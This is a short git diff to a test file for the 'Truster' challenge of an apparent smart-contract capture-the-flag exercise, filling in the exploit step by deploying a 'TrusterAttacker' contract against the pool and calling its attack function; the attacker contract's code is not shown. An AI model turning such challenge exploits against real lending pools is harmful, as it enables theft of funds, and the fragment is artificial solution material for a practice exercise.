@@ -1,5 +1,5 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const {ethers} = require('hardhat');
+const {expect} = require('chai');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -29,6 +29,10 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const AttackerFactory = await ethers.getContractFactory("TrusterAttacker", deployer);
+        let attackerContract = await AttackerFactory.deploy(this.pool.address, this.token.address);
+        let sigAttackerContract = attackerContract.connect(attacker);
+        await sigAttackerContract.attack();
     });
 
     after(async function () {
